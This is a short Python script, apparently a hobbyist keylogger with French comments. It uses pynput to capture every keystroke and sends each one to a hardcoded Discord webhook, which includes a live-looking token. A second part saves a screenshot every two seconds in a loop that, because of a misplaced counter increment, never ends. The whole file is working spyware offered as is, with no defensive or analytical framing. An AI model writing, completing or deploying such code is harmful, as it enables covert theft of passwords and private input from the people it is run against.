import pynput
from pynput.keyboard import Key, Listener
import requests
import time
import pyautogui
import pyautogui


webhook = "https://discord.com/api/webhooks/1132444091825782794/HxaGf28ZLI_c2vJ43p60E420rw2fO0YF0wUpJr853WDPAUJhJ5eAnFEO-Y7nXq1PWVAo"



class Log:

    def __init__(self):
        self.count = 0
        self.keys = []

    def on_press(self, key):
        #print(f"'{key}' pressed")
        #ici webhook
        data = requests.post(webhook, json={'content': f"'{key}'' pressed"})
    def on_release(self, key):
        if key == Key.esc:
            return False
#-------------------------------------------------1er part au top--------------------------------------------------------------

#_______________________________________1er_part_____________________________________________
if __name__ == "__main__":
    obj = Log()
    with Listener(on_press = obj.on_press, on_release = obj.on_release) as listener:
        listener.join()
#____________________________________________________________________________________________


i = 0
while i < 1000000:  

    screen = pyautogui.screenshot()
    screen.save('image\image.png')
    time.sleep(2)
print("i a pour valeur", i)
i = i + 1
